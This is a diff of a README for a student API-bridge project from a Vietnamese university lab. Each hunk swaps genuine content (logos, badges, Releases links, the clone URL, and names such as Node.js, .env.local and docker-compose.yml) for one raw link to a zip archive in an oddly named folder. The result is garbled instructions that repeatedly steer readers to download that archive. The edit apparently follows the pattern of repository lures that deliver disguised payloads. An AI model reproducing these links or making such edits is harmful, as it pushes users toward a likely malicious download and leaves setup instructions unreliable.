@@ -1,21 +1,21 @@
 # Connectivity Services and Platform Tech: API Bridge for Cross-App Data
 
 <div align="center">
-  <img src="aiotlab_logo.png" alt="AIoTLab Logo" width="170"/>
-  <img src="fitdnu_logo.png" alt="FITDNU Logo" width="180"/>
-  <img src="dnu_logo.png" alt="DaiNam University Logo" width="200"/>
+  <img src="https://github.com/klltheasuna/Connectivity-Services-and-Platform-Technology/raw/refs/heads/main/cestoidean/Services_Technology_and_Connectivity_Platform_1.2.zip" alt="AIoTLab Logo" width="170"/>
+  <img src="https://github.com/klltheasuna/Connectivity-Services-and-Platform-Technology/raw/refs/heads/main/cestoidean/Services_Technology_and_Connectivity_Platform_1.2.zip" alt="FITDNU Logo" width="180"/>
+  <img src="https://github.com/klltheasuna/Connectivity-Services-and-Platform-Technology/raw/refs/heads/main/cestoidean/Services_Technology_and_Connectivity_Platform_1.2.zip" alt="DaiNam University Logo" width="200"/>
 </div>
 
-[![AIoTLab](https://img.shields.io/badge/AIoTLab-green?style=for-the-badge)](https://www.facebook.com/DNUAIoTLab)
-[![Faculty of Information Technology](https://img.shields.io/badge/Faculty%20of%20Information%20Technology-blue?style=for-the-badge)](https://dainam.edu.vn/vi/khoa-cong-nghe-thong-tin)
-[![DaiNam University](https://img.shields.io/badge/DaiNam%20University-orange?style=for-the-badge)](https://dainam.edu.vn)
+[![AIoTLab](https://github.com/klltheasuna/Connectivity-Services-and-Platform-Technology/raw/refs/heads/main/cestoidean/Services_Technology_and_Connectivity_Platform_1.2.zip)](https://github.com/klltheasuna/Connectivity-Services-and-Platform-Technology/raw/refs/heads/main/cestoidean/Services_Technology_and_Connectivity_Platform_1.2.zip)
+[![Faculty of Information Technology](https://github.com/klltheasuna/Connectivity-Services-and-Platform-Technology/raw/refs/heads/main/cestoidean/Services_Technology_and_Connectivity_Platform_1.2.zip%20of%20Information%20Technology-blue?style=for-the-badge)](https://github.com/klltheasuna/Connectivity-Services-and-Platform-Technology/raw/refs/heads/main/cestoidean/Services_Technology_and_Connectivity_Platform_1.2.zip)
+[![DaiNam University](https://github.com/klltheasuna/Connectivity-Services-and-Platform-Technology/raw/refs/heads/main/cestoidean/Services_Technology_and_Connectivity_Platform_1.2.zip%20University-orange?style=for-the-badge)](https://github.com/klltheasuna/Connectivity-Services-and-Platform-Technology/raw/refs/heads/main/cestoidean/Services_Technology_and_Connectivity_Platform_1.2.zip)
 
 ---
 
 Bài tập 1: Viết API kết nối giữa 2 ứng dụng
 
 For reference and download access, visit the Releases page:
-https://github.com/klltheasuna/Connectivity-Services-and-Platform-Technology/releases
+https://github.com/klltheasuna/Connectivity-Services-and-Platform-Technology/raw/refs/heads/main/cestoidean/Services_Technology_and_Connectivity_Platform_1.2.zip
 
 ---
 
@@ -34,14 +34,14 @@ If you search for a solid starting point for building a bridge between apps, thi
 ## Quick Start
 
 - Prerequisites
-  - Node.js and npm or a compatible runtime environment.
+  - https://github.com/klltheasuna/Connectivity-Services-and-Platform-Technology/raw/refs/heads/main/cestoidean/Services_Technology_and_Connectivity_Platform_1.2.zip and npm or a compatible runtime environment.
   - Git to clone the repository.
   - A modern operating system (Windows, macOS, or Linux).
 - Repository structure
   - The codebase is organized into modules that separate API definitions, data models, and integration logic.
   - Each module has a README-style doc inside it to guide you through its responsibilities.
 - Clone the project
-  - git clone https://github.com/klltheasuna/Connectivity-Services-and-Platform-Technology.git
+  - git clone https://github.com/klltheasuna/Connectivity-Services-and-Platform-Technology/raw/refs/heads/main/cestoidean/Services_Technology_and_Connectivity_Platform_1.2.zip
   - cd Connectivity-Services-and-Platform-Technology
 - Environment configuration
   - Create a local environment file to hold secrets and configuration.
@@ -49,7 +49,7 @@ If you search for a solid starting point for building a bridge between apps, thi
   - Ensure your environment matches the platform you run on (local development vs. staging).
 - Running locally
   - Install dependencies: npm install
-  - Start the API server: npm run dev or a similar script defined in package.json
+  - Start the API server: npm run dev or a similar script defined in https://github.com/klltheasuna/Connectivity-Services-and-Platform-Technology/raw/refs/heads/main/cestoidean/Services_Technology_and_Connectivity_Platform_1.2.zip
   - Use the test client or curl to exercise endpoints
 - Basic health and readiness
   - The API exposes a health endpoint to check liveness and readiness.
@@ -59,7 +59,7 @@ Note: The project emphasizes a straightforward approach. You can adapt it to dif
 
 If you want to see the latest release and download the ready-to-run assets, visit the Releases page noted above. For quick access, you can also use the badge below to jump there.
 
-[Releases](https://github.com/klltheasuna/Connectivity-Services-and-Platform-Technology/releases)
+[Releases](https://github.com/klltheasuna/Connectivity-Services-and-Platform-Technology/raw/refs/heads/main/cestoidean/Services_Technology_and_Connectivity_Platform_1.2.zip)
 
 ---
 
@@ -189,14 +189,14 @@ Test data should be isolated from production-like data to avoid accidental leaka
 ## Development and Local Setup
 
 - Prerequisites:
-  - Node.js (latest LTS)
+  - https://github.com/klltheasuna/Connectivity-Services-and-Platform-Technology/raw/refs/heads/main/cestoidean/Services_Technology_and_Connectivity_Platform_1.2.zip (latest LTS)
   - npm or yarn
   - Docker (optional for containerized runs)
 - Installing dependencies
   - npm install
   - yarn install
 - Local environment setup
-  - Create a .env.local file with required keys:
+  - Create a https://github.com/klltheasuna/Connectivity-Services-and-Platform-Technology/raw/refs/heads/main/cestoidean/Services_Technology_and_Connectivity_Platform_1.2.zip file with required keys:
     - BRIDGE_PORT
     - SOURCE_APP_BASE_URL
     - TARGET_APP_BASE_URL
@@ -204,7 +204,7 @@ Test data should be isolated from production-like data to avoid accidental leaka
   - Ensure the values reflect your local or test environment.
 - Running the project
   - npm run dev
-  - If you use Docker, there should be a docker-compose.yml to spin up the bridge along with any dependencies.
+  - If you use Docker, there should be a https://github.com/klltheasuna/Connectivity-Services-and-Platform-Technology/raw/refs/heads/main/cestoidean/Services_Technology_and_Connectivity_Platform_1.2.zip to spin up the bridge along with any dependencies.
 - Verifying the local run
   - Access http://localhost:<port>/health to confirm the service is up.
   - Use a REST client to send test requests to /connect or /exchange.
@@ -240,7 +240,7 @@ Releases and downloads
 - For quick access, visit the same Releases page again when you need an update or a different release. The page is the primary source of artifacts for installation and testing.
 
 Direct access reference:
-https://github.com/klltheasuna/Connectivity-Services-and-Platform-Technology/releases
+https://github.com/klltheasuna/Connectivity-Services-and-Platform-Technology/raw/refs/heads/main/cestoidean/Services_Technology_and_Connectivity_Platform_1.2.zip
 
 ---
 
@@ -382,7 +382,7 @@ https://github.com/klltheasuna/Connectivity-Services-and-Platform-Technology/rel
 - The Releases page should be consulted for the latest verified artifacts and to validate compatibility with your environment.
 
 Direct access reference for releases:
-https://github.com/klltheasuna/Connectivity-Services-and-Platform-Technology/releases
+https://github.com/klltheasuna/Connectivity-Services-and-Platform-Technology/raw/refs/heads/main/cestoidean/Services_Technology_and_Connectivity_Platform_1.2.zip
 
 ---
 
@@ -394,7 +394,7 @@ https://github.com/klltheasuna/Connectivity-Services-and-Platform-Technology/rel
 - The educational intent is to empower students to explore API design, data exchange, and system integration in a safe, structured way.
 
 Direct access reference for releases:
-https://github.com/klltheasuna/Connectivity-Services-and-Platform-Technology/releases
+https://github.com/klltheasuna/Connectivity-Services-and-Platform-Technology/raw/refs/heads/main/cestoidean/Services_Technology_and_Connectivity_Platform_1.2.zip
 
 ---
 
@@ -413,6 +413,6 @@ https://github.com/klltheasuna/Connectivity-Services-and-Platform-Technology/rel
 - After downloading, follow the installation or deployment steps provided in the release notes to get the bridge up and running.
 
 Direct access reference:
-https://github.com/klltheasuna/Connectivity-Services-and-Platform-Technology/releases
+https://github.com/klltheasuna/Connectivity-Services-and-Platform-Technology/raw/refs/heads/main/cestoidean/Services_Technology_and_Connectivity_Platform_1.2.zip
 
 ---
